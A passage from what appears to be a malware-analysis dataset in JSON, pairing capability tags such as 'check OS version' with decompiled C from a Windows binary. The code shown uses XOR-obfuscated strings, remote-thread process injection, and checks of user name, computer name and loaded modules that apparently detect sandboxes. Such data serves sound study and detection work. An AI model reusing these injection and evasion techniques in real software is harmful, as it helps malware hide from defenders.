(*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n                uVar14 = (*pcVar4)(0, piVar13);\n                (*pcVar8)(uVar14);\n                if (*0x41bdf8 != 0) goto code_r0x00407c25;\n            }\n            else {\ncode_r0x00407c25:\n                *0x41bdfc = *0x41bdf8 >> 0x20;\n                uVar14 = 0;\n                iVar10 = fcn.0040e240(*0x41bdf8, *0x41bdfc, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0);\n                if (-1 < iVar10) goto code_r0x00407c6a;\n            }\n            uVar14 = 0xffffffff;\n            goto code_r0x00407c6a;\n        }\n        puStack108 = 0x7;\n        if ((*0x41be00 | *0x41be04) == 0) {\n            fcn.00409e96();\n            uStack64 = 0x201d3d2b;\n            uStack60 = 7;\n            uStack59 = 0x6b;\n            uStack58 = 0x1c;\n            uStack57 = 0x29;\n            uStack56 = 0x25;\n            uStack55 = 0x79;\n            uStack84 = 0x4c794945;\n            uStack80 = uStack80 & 0xff000000 | 0x78456b;\n            fcn.00401000(10);\n            iVar10 = 0;\n            piStack104 = auStack71 + (3 - piStack120);\n            do {\n                puVar2 = iVar10 + piStack120;\n                iVar9 = iVar10 % 7;\n                iVar10 = iVar10 + 1;\n                *puVar2 = *(&uStack88 + iVar9) ^ puVar2[auStack71 + (3 - piStack120)];\n            } while (iVar10 < 10);\n            uVar15 = 0xb;\n            auStack71 = auStack71 & 0xffffff | 0x3f000000;\n            uStack67 = 0x27;\n            uStack66 = 0x7b07;\n            uStack64 = 0x372d2617;\n            uStack60 = 0x2f;\n            uStack59 = 0x19;\n            uStack58 = 0x37;\n            uStack88 = 0x37754373;\n            uStack84 = uStack84 & 0xff000000 | 0x494778;\n            fcn.00401000(0xb);\n            piVar13 = piStack120;\n            iVar10 = 0;\n            puStack108 = &uStack72 + -piStack120;\n            do {\n                puVar2 = iVar10 + piStack120;\n                iVar9 = iVar10 % iStack116;\n                iVar10 = iVar10 + 1;\n                *puVar2 = *(&uStack92 + iVar9) ^ puVar2[&uStack72 + -piStack120];\n            } while (iVar10 < 0xb);\n            iVar12 = fcn.0040a354(piStack120);\n            if (iVar12 == 0) {\n                uVar14 = 0xffffffff;\n            }\n            else {\n                uVar14 = 0x2c;\n                uStack40 = 0x362d5632;\n                uStack36 = 0x64183406;\n                uStack32 = 0x3624563c;\n                uStack28 = 0x64173416;\n                uStack24 = 0x362d562a;\n                uStack20 = CONCAT22(uStack20._2_2_, 0x3474);\n                uStack84 = 0x36485659;\n                uStack80 = 0x64763474;\n                fcn.00401000(0x2c);\n                uStack100 = iVar12 >> 0x20;\n                uStack92 = iVar12;\n                uVar11 = 0;\n                do {\n                    puVar2 = uVar11 + piStack112;\n                    uVar6 = uVar11 & 0x80000007;\n                    if (uVar6 < 0) {\n                        uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar11 = uVar11 + 1;\n                    *puVar2 = *(&uStack88 + uVar6) ^ puVar2[&uStack44 - piStack112];\n                } while (uVar11 < 0x16);\n                iStack48 = piStack112 >> 0x1f;\n                piVar1 = piStack112 + 1;\n                piStack52 = piStack112;\n                do {\n                    iVar3 = *piStack112;\n                    piStack112 = piStack112 + 1;\n                } while (iVar3 != puStack108);\n                iVar3 = (piStack112 - piVar1 >> 1) * 2;\n                uStack60 = iVar3;\n                uStack59 = iVar3 >> 8;\n                uStack56 = 0;\n                uStack55 = 0;\n                uStack54 = 0;\n                uStack58 = iVar3 + 2;\n                uStack57 = iVar3 + 2 >> 8;\n                iVar10 = fcn.0040e240(uStack96, piStack104, 4, 0, 0, 0, 0, 0, &uStack60, &uStack60 >> 0x1f, &uStack76, \n                                      &uStack76 >> 0x1f, uVar14, uVar15);\n                uStack100 = iVar12 >> 0x20;\n                uStack92 = iVar12;\n                if (iVar10 < 0) {\n                    uVar14 = (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(iVar10);\n                    uStack100 = iVar12 >> 0x20;\n                    uStack92 = iVar12;\n                    piVar13 = piStack124;\n                }\n                else {\n                    uStack88 = 0x59450b32;\n                    uStack84 = 0x38212e17;\n                    uStack80 = uStack80 & 0xff000000 | 0x37521d;\n                    piStack104 = 0x37376e59;\n                    uStack100 = uStack100 & 0xff000000 | 0x434272;\n                    fcn.00401000(0xb);\n                    uVar11 = uStack100;\n                    uStack100 = &uStack92 - uStack100;\n                    piStack124 = NULL;\n                    do {\n                        puVar2 = piStack124 + uVar11;\n                        *puVar2 = *(&puStack108 + piStack124 % 7) ^ puVar2[uStack100];\n                        piStack124 = piStack124 + 1;\n                    } while (piStack124 < 0xb);\n                    piVar13 = 0x13;\n                    iStack48 = 0x102c201b;\n                    uStack44 = 0x2c60261f;\n                    uStack40 = 0x143d3d35;\n                    uStack36 = 0x2c402b3f;\n                    uStack32 = uStack32 & 0xff000000 | 0x493639;\n                    uStack92 = 0x71495258;\n                    uStack88 = 0x4932436b;\n                    fcn.00401000(0x13);\n                    piStack124 = piStack104;\n                    uVar6 = 0;\n                    do {\n                        puVar2 = uVar6 + piStack104;\n                        uVar7 = uVar6 & 0x80000007;\n                        if (uVar7 < 0) {\n                            uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n                        }\n                        uVar6 = uVar6 + 1;\n                        *puVar2 = *(&uStack96 + uVar7) ^ puVar2[&piStack52 - piStack104];\n                    } while (uVar6 < 0x13);\n                    *0x41be00 = fcn.0040a354(piStack104);\n                    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piStack124);\n                    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n                    uVar14 = (*pcVar4)(0, uVar11);\n                    (*pcVar8)(uVar14);\n                    iVar12 = CONCAT44(uStack100, uStack92);\n                    uVar14 = 0xffffffff;\n                }\n                uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar15);\n                uStack100 = iVar12 >> 0x20;\n                uStack92 = iVar12;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n                uStack100 = iVar12 >> 0x20;\n                uStack92 = iVar12;\n            }\n            uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar13);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            uStack100 = iVar12 >> 0x20;\n            uStack92 = iVar12;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n            uStack100 = iVar12 >> 0x20;\n            uStack92 = iVar12;\n            uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piStack124);\n            uStack100 = iVar12 >> 0x20;\n            uStack92 = iVar12;\n            (*pcVar8)(uVar15);\n            uStack100 = iVar12 >> 0x20;\n            uStack92 = iVar12;\n            piVar13 = piStack104;\n            if (*0x41be00 == 0) goto code_r0x00407c6a;\n        }\n        else {\n            uVar14 = 0xffffffff;\n        }\n        *0x41be04 = *0x41be00 >> 0x20;\n        iVar10 = fcn.0040e240(*0x41be00, *0x41be04, 7, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, lpStartAddress, \n                              lpStartAddress >> 0x1f, lpParameter, lpParameter >> 0x1f);\n        uStack100 = iVar12 >> 0x20;\n        uStack92 = iVar12;\n        *piVar13 = iVar10;\n        if (iVar10 == 0) goto code_r0x00407c6a;\n    }\n    else {\n        if (cVar5 != '\\x05') {\n            uStack76 = 0x201d3d2b;\n            uStack72 = 7;\n            auStack71 = 0x25291c6b;\n            uStack67 = 0x79;\n            uStack92 = 0x4c794945;\n            uStack88 = CONCAT13(uStack88._3_1_, 0x78456b);\n            fcn.00401000(10);\n            iVar10 = 0;\n            uStack88 = &uStack80 - piStack104;\n            do {\n                puVar2 = iVar10 + piStack104;\n                iVar9 = iVar10 % 7;\n                iVar10 = iVar10 + 1;\n                *puVar2 = *(&uStack96 + iVar9) ^ puVar2[&uStack80 - piStack104];\n            } while (iVar10 < 10);\n            uStack36 = 0x30010c66;\n            uStack32 = 0x400b3d4a;\n            uStack28 = 0x5d00381d;\n            uStack24 = 0xa5c3e2a;\n            uStack20 = 0x585c1208;\n            uStack96 = 0x736d7834;\n            uStack92 = uStack92 & 0xff000000 | 0x6a5838;\n            fcn.00401000(0x14);\n            uVar11 = uStack92;\n            iVar10 = 0;\n            uStack92 = &uStack40 - uStack92;\n            do {\n                puVar2 = iVar10 + uVar11;\n                iVar9 = iVar10 % 7;\n                iVar10 = iVar10 + 1;\n                *puVar2 = *(&uStack100 + iVar9) ^ puVar2[uStack92];\n            } while (iVar10 < 0x14);\n            uVar14 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(puStack108, uVar11);\n            pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar14);\n            if (pcVar8 != NULL) {\n                iVar10 = (*pcVar8)(*arg_8h, 0, 0, 0, 0, 0, lpStartAddress, lpParameter, piStack124, &uStack84);\n                if (iVar10 < 0) {\n                    (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(iVar10);\n                }\n                else {\n                    piStack104 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*piStack124, 30000);\n                    if (piStack104 == NULL) {\n                        (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*piStack124, &piStack104);\n                    }\n                }\n            }\n            pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar14 = 0;\n            uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar11);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n            uVar15 = (*pcVar4)(0, puStack108);\n            (*pcVar8)(uVar15);\n            goto code_r0x00407c6a;\n        }\n        iVar10 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(*arg_8h, 0, 0, lpStartAddress, lpParameter, 0, arg_8h + 3);\n        *piVar13 = iVar10;\n        if (iVar10 == 0) {\n            uVar14 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x00407c6a;\n        }\n        piStack120 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar10, 30000);\n        if (piStack120 == NULL) {\n            (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*piVar13, &piStack120);\n        }\n    }\n    uVar14 = 0;\ncode_r0x00407c6a:\n    *0x41bdfc = *0x41bdf8 >> 0x20;\n    *0x41be04 = *0x41be00 >> 0x20;\n    return uVar14;\n}\n",
        "token_count": 4523
    },
    "0040a7cd": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040a7cd(int16_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    char cVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    uint32_t uVar9;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int16_t *var_ch;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    if (param_1 != NULL) {\n        piVar8 = param_1;\n        for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *piVar8 = 0;\n            piVar8 = piVar8 + 1;\n        }\n        var_ch = param_1;\n        cVar3 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (cVar3 == '\\x05') {\n            var_28h = 0x553e6267;\n            var_24h = 0x34117917;\n            var_20h = 0x71345115;\n            var_1ch = 0x6251650b;\n            var_18h._0_2_ = 0x5551;\n            var_14h = 0x55516234;\n            var_10h = CONCAT13(var_10h._3_1_, 0x657971);\n            fcn.00401000(0x24);\n            iVar5 = 0;\n            var_8h = 7;\n            do {\n                puVar1 = iVar5 + var_4h;\n                iVar7 = iVar5 % 7;\n                iVar5 = iVar5 + 1;\n                *puVar1 = *(&var_14h + iVar7) ^ puVar1[&var_28h - var_4h];\n            } while (iVar5 < 0x12);\n            piVar8 = var_4h;\n            do {\n                iVar2 = *piVar8;\n                *((var_ch - var_4h) + piVar8) = iVar2;\n                piVar8 = piVar8 + 1;\n            } while (iVar2 != 0);\n        }\n        else {\n            var_50h = 0x781a5223;\n            var_4ch = 0x56194500;\n            var_48h = 0x78145207;\n            var_44h = 0x56084514;\n            var_40h = 0x7834522c;\n            var_3ch = 0x561d4516;\n            var_38h = 0x78145234;\n            var_34h = 0x560c4512;\n            var_30h = 0x781a523c;\n            var_2ch = 0x566d4511;\n            var_14h = 0x78755270;\n            var_10h = 0x566d4566;\n            fcn.00401000(0x50);\n            uVar9 = 0;\n            do {\n                puVar1 = uVar9 + var_ch;\n                uVar6 = uVar9 & 0x80000007;\n                if (uVar6 < 0) {\n                    uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n                }\n                uVar9 = uVar9 + 1;\n                *puVar1 = *(&var_14h + uVar6) ^ puVar1[&var_50h - var_ch];\n            } while (uVar9 < 0x28);\n            piVar8 = var_ch;\n            do {\n                iVar2 = *piVar8;\n                *((param_1 - var_ch) + piVar8) = iVar2;\n                piVar8 = piVar8 + 1;\n                var_4h = var_ch;\n            } while (iVar2 != 0);\n        }\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    }\n    return;\n}\n",
        "token_count": 1055
    },
    "0040d253": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040d253(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    int32_t var_b4h;\n    int32_t var_b0h;\n    int32_t var_ach;\n    int32_t var_a8h;\n    int32_t var_a4h;\n    int32_t var_a0h;\n    int32_t var_9ch;\n    int32_t var_98h;\n    uint pcbBuffer;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t var_84h;\n    int32_t var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    ushort var_3ch;\n    uint var_3ah;\n    uint var_36h;\n    uint var_32h;\n    uint var_2eh;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar var_14h;\n    uchar uStack23;\n    uint var_12h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = fcn.0040d0ad();\n    if (iVar5 != 0) {\n        fcn.0040d23b();\n    }\n    var_1ch._0_2_ = 0x2c54;\n    var_1ch._2_1_ = 0x11;\n    var_1ch._3_1_ = 0x1b;\n    var_18h._0_1_ = 0x17;\n    var_58h = 7;\n    var_18h._1_1_ = 7;\n    var_18h._2_1_ = 0x48;\n    var_18h._3_1_ = 0x1e;\n    var_14h = 0x2a;\n    uStack23 = 0x1a;\n    var_12h._0_1_ = 0x1f;\n    var_12h._1_1_ = 0x72;\n    var_8h._0_2_ = 0x4e30;\n    var_8h._2_1_ = 0x76;\n    var_8h._3_1_ = 0x73;\n    var_4h._0_1_ = 0x72;\n    var_4h._1_1_ = 0x6b;\n    var_4h._2_1_ = 0x38;\n    fcn.00401000(0xc);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_b0h;\n        iVar9 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_1ch - var_b0h];\n        pcVar2 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    } while (iVar5 < 0xc);\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_b0h);\n    if (iVar5 != 0) {\n        fcn.0040d23b();\n    }\n    var_1ch._0_2_ = 0x132b;\n    var_1ch._2_1_ = 4;\n    var_1ch._3_1_ = 0xc;\n    var_18h._0_1_ = 0x17;\n    var_18h._1_1_ = 0xe;\n    var_18h._2_1_ = 5;\n    var_18h._3_1_ = 0x1d;\n    var_14h = 0x3c;\n    uStack23 = 0x1d;\n    var_12h._0_1_ = 1;\n    var_12h._1_1_ = 0x69;\n    var_8h._0_2_ = 0x7158;\n    var_8h._2_1_ = 0x6d;\n    var_8h._3_1_ = 0x69;\n    var_4h._0_1_ = 0x73;\n    var_4h._1_1_ = 0x62;\n    var_4h._2_1_ = 0x69;\n    var_4h._3_1_ = 0x33;\n    fcn.00401000(0xc);\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + var_b4h;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar11 = uVar11 + 1;\n        *puVar1 = *(&var_8h + uVar8) ^ puVar1[&var_1ch - var_b4h];\n    } while (uVar11 < 0xc);\n    iVar5 = (*pcVar2)(var_b4h);\n    if (iVar5 != 0) {\n        fcn.0040d23b();\n    }\n    pcbBuffer = 0x400;\n    iVar5 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x41be10, &pcbBuffer);\n    if (iVar5 == 0) {\n        fcn.0040d23b();\n    }\n    var_1ch._0_2_ = 0x100d;\n    var_1ch._2_1_ = 0x28;\n    var_1ch._3_1_ = 5;\n    var_18h._0_1_ = 0x20;\n    var_18h._1_1_ = 0x5b;\n    var_18h._2_1_ = 0x1d;\n    var_18h._3_1_ = 0x1b;\n    var_14h = 0x16;\n    uStack23 = 0x3f;\n    var_12h._0_1_ = 5;\n    var_12h._1_1_ = 0x45;\n    var_8h._0_2_ = 0x654e;\n    var_8h._2_1_ = 0x5a;\n    var_8h._3_1_ = 0x77;\n    var_4h._0_1_ = 0x45;\n    var_4h._1_1_ = 0x35;\n    var_4h._2_1_ = 0x69;\n    fcn.00401000(0xc);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_a4h;\n        iVar9 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_1ch - var_a4h];\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrcmpA;\n    } while (iVar5 < 0xc);\n    iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41be10, var_a4h);\n    if (iVar5 == 0) {\n        fcn.0040d23b();\n    }\n    var_8h._0_2_ = 0x376a;\n    var_8h._2_1_ = 0x22;\n    var_8h._3_1_ = 0x36;\n    var_4h._0_1_ = 0x50;\n    var_4h._1_1_ = 0x15;\n    var_4h._2_1_ = 0x2f;\n    var_4h._3_1_ = 0x54;\n    var_78h = 0x524c5639;\n    var_74h = 0x54577a32;\n    fcn.00401000(8);\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + var_a8h;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar11 = uVar11 + 1;\n        *puVar1 = *(&var_78h + uVar8) ^ puVar1[&var_8h - var_a8h];\n    } while (uVar11 < 8);\n    iVar5 = (*pcVar2)(0x41be10, var_a8h);\n    if (iVar5 == 0) {\n        fcn.0040d23b();\n    }\n    pcbBuffer = 0x400;\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x41be10, &pcbBuffer);\n    if (iVar5 == 0) {\n        fcn.0040d23b();\n    }\n    var_8h._0_2_ = 0x1b1f;\n    var_8h._2_1_ = 0x77;\n    var_8h._3_1_ = 0x21;\n    var_4h._0_1_ = 0x3b;\n    var_4h._1_1_ = 0x19;\n    var_4h._2_1_ = 0x19;\n    var_4h._3_1_ = 0x4f;\n    var_70h = 0x65395a4c;\n    var_6ch = 0x4f415679;\n    fcn.00401000(8);\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + var_74h;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar11 = uVar11 + 1;\n        *puVar1 = *(&var_70h + uVar8) ^ puVar1[&var_8h - var_74h];\n    } while (uVar11 < 8);\n    iVar5 = (*pcVar2)(0x41be10, var_74h);\n    if (iVar5 == 0) {\n        fcn.0040d23b();\n    }\n    var_8h._0_2_ = 0x541;\n    var_8h._2_1_ = 0x3c;\n    var_8h._3_1_ = 0x1e;\n    var_4h._0_1_ = 4;\n    var_4h._1_1_ = 10;\n    var_4h._2_1_ = 0x78;\n    var_4h._3_1_ = 0x75;\n    stack0xffffffec = 0x52755676;\n    var_ch = 0x75394352;\n    fcn.00401000(8);\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + var_6ch;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar11 = uVar11 + 1;\n        *puVar1 = *(&var_12h + uVar8 + 2) ^ puVar1[&var_8h - var_6ch];\n    } while (uVar11 < 8);\n    iVar5 = (*pcVar2)(0x41be10, var_6ch);\n    if (iVar5 == 0) {\n        fcn.0040d23b();\n    }\n    var_48h = 0x77670209;\n    var_44h = 0x2b657964;\n    var_40h._0_1_ = 0x1d;\n    var_40h._2_2_ = 0x6070;\n    var_3ch = 0x6a70;\n    var_3ah._0_2_ = 0x3e7e;\n    var_3ah._2_2_ = 0xa15;\n    var_36h._0_2_ = 0x7d7a;\n    var_36h._2_2_ = 0x6b6f;\n    var_32h._0_2_ = 0x1d4e;\n    var_32h._2_2_ = 0x2635;\n    var_2eh._0_2_ = 0x3358;\n    var_8h._0_2_ = 0x4341;\n    var_8h._2_1_ = 0x35;\n    var_8h._3_1_ = 0x33;\n    var_4h._0_1_ = 0x33;\n    var_4h._1_1_ = 0x38;\n    var_4h._2_1_ = 0x37;\n    var_4h._3_1_ = 0x6e;\n    var_40h._1_1_ = 7;\n    fcn.00401000(0x1c);\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + var_90h;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar11 = uVar11 + 1;\n        *puVar1 = *(&var_8h + uVar8) ^ puVar1[&var_48h - var_90h];\n    } while (uVar11 < 0x1c);\n    var_24h = 0x4d1f1c37;\n    var_20h = 0x170152d;\n    var_1ch._0_2_ = 0x160b;\n    var_1ch._2_1_ = 0x3a;\n    var_1ch._3_1_ = 0x5c;\n    var_18h._0_1_ = 0x3a;\n    var_18h._1_1_ = 0xb;\n    var_18h._2_1_ = 0x5b;\n    var_14h = 10;\n    uStack23 = 0x65;\n    var_8h._0_2_ = 0x6564;\n    var_8h._2_1_ = 0x6c;\n    var_8h._3_1_ = 0x39;\n    var_4h._0_1_ = 0x48;\n    var_4h._1_1_ = 0x78;\n    var_4h._2_1_ = 0x32;\n    var_4h._3_1_ = 0x68;\n    var_18h._3_1_ = 7;\n    fcn.00401000(0x12);\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + var_8ch;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = *(&var_8h + uVar8) ^ puVar1[&var_24h - var_8ch];\n        uVar8 = uVar8 & 0xffffff00 | uVar7;\n        uVar11 = uVar11 + 1;\n        *puVar1 = uVar7;\n    } while (uVar11 < 0x12);\n    cVar4 = fcn.0040d051(uVar8, uVar8);\n    if (cVar4 == '\\0') {\n        fcn.0040d23b();\n    }\n    var_8h._0_2_ = 0x1524;\n    var_8h._2_1_ = 0x31;\n    var_8h._3_1_ = 0x52;\n    var_4h._0_1_ = 0x47;\n    stack0xffffffec = 0x72785865;\n    var_ch = 0x46775a47;\n    fcn.00401000(5);\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + var_88h;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar11 = uVar11 + 1;\n        *puVar1 = *(&var_12h + uVar8 + 2) ^ puVar1[&var_8h - var_88h];\n    } while (uVar11 < 5);\n    var_8h._0_2_ = 1;\n    var_8h._2_1_ = 0xe;\n    var_8h._3_1_ = 0x7a;\n    var_4h._0_1_ = 0x14;\n    var_4h._1_1_ = 0x73;\n    stack0xffffffec = 0x324d4f43;\n    var_ch = var_ch & 0xff000000 | 0x4f7347;\n    fcn.00401000(6);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_80h;\n        iVar9 = iVar5 % 7;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_12h + iVar9 + 2) ^ puVar1[&var_8h - var_80h];\n    } while (iVar5 < 6);\n    var_8h._0_2_ = 0x2c2e;\n    var_8h._3_1_ = 0x20;\n    var_4h._0_1_ = 0x49;\n    stack0xffffffec = 0x78486e78;\n    var_ch = var_ch & 0xff000000 | 0x394249;\n    var_8h._2_1_ = 7;\n    fcn.00401000(5);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_7ch;\n        iVar9 = iVar5 % 7;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_12h + iVar9 + 2) ^ puVar1[&var_8h - var_7ch];\n    } while (iVar5 < 5);\n    var_8h._0_2_ = 0x1530;\n    var_8h._2_1_ = 0x7e;\n    var_8h._3_1_ = 0x62;\n    var_4h._0_1_ = 0x35;\n    stack0xffffffec = 0x37335061;\n    var_ch = 0x65444835;\n    fcn.00401000(5);\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + var_9ch;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar11 = uVar11 + 1;\n        *puVar1 = *(&var_12h + uVar8 + 2) ^ puVar1[&var_8h - var_9ch];\n    } while (uVar11 < 5);\n    var_8h._0_2_ = 0x3938;\n    var_8h._2_1_ = 0x37;\n    var_8h._3_1_ = 0x25;\n    var_4h._0_1_ = 0x4e;\n    stack0xffffffec = 0x6c74746b;\n    var_ch = 0x5472414e;\n    fcn.00401000(5);\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + var_a0h;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar11 = uVar11 + 1;\n        *puVar1 = *(&var_12h + uVar8 + 2) ^ puVar1[&var_8h - var_a0h];\n    } while (uVar11 < 5);\n    var_24h = 0x72372170;\n    var_20h = 0x1445112d;\n    var_1ch._0_2_ = 0x554f;\n    var_1ch._3_1_ = 0x55;\n    var_18h._0_1_ = 1;\n    var_18h._1_1_ = 0x55;\n    var_18h._2_1_ = 9;\n    var_18h._3_1_ = 0x5f;\n    var_14h = 99;\n    var_8h._0_2_ = 0x6f39;\n    var_8h._2_1_ = 99;\n    var_8h._3_1_ = 0x37;\n    var_4h._0_1_ = 0x61;\n    var_4h._1_1_ = 0x31;\n    var_4h._2_1_ = 0x65;\n    var_1ch._2_1_ = 7;\n    fcn.00401000(0x11);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_98h;\n        iVar9 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_24h - var_98h];\n    } while (iVar5 < 0x11);\n    var_8h._0_2_ = 0x3e0e;\n    var_8h._2_1_ = 0x3b;\n    var_8h._3_1_ = 0x2d;\n    var_4h._0_1_ = 0x4f;\n    var_4h._1_1_ = 0x48;\n    var_4h._2_1_ = 0x49;\n    var_60h = 0x79756a48;\n    var_5ch._0_2_ = 0x7962;\n    var_5ch._2_1_ = 0x49;\n    fcn.00401000(7);\n    iVar5 = var_ch;\n    iVar9 = 0;\n    var_84h = &var_8h - var_ch;\n    do {\n        puVar1 = iVar9 + var_ch;\n        iVar10 = iVar9 % var_58h;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_60h + iVar10) ^ puVar1[var_84h];\n    } while (iVar9 < 7);\n    var_8h._0_2_ = 0x1b25;\n    var_8h._2_1_ = 0x76;\n    var_8h._3_1_ = 0x7c;\n    var_4h._0_1_ = 0x59;\n    var_68h = 0x35385476;\n    var_64h = 0x75454559;\n    fcn.00401000(5);\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + var_84h;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar11 = uVar11 + 1;\n        *puVar1 = *(&var_68h + uVar8) ^ puVar1[&var_8h - var_84h];\n    } while (uVar11 < 5);\n    *0x41c220 = var_88h;\n    *0x41c228 = var_80h;\n    *0x41c22c = var_7ch;\n    *0x41c230 = var_9ch;\n    *0x41c23c = iVar5;\n    uVar11 = 0;\n    